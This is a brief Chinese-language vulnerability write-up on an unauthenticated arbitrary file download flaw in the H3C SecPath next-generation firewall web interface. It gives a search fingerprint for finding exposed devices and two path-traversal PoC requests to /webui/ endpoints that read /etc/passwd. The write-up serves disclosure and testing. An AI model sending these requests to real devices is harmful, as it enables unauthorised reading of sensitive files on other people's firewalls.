# H3C SecPath下一代防火墙 任意文件下载漏洞

## 漏洞描述

H3C SecPath 下一代防火墙  存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息

## 漏洞影响

```
H3C SecPath
```

## 网络测绘

```
title="Web user login"
```

## 漏洞复现

登录页面如下

![](images/202202110914717.png)

存在漏洞点的功能有两个

![](images/202202110914728.png)

点击下载抓包更改请求

![](images/202202110914422.png)

并且在未身份验证的情况中，也可以请求下载敏感文件

验证POC

```plain
/webui/?g=sys_dia_data_check&file_name=../../etc/passwd

/webui/?
g=sys_capture_file_download&name=../../../../../../../../etc/passwd
```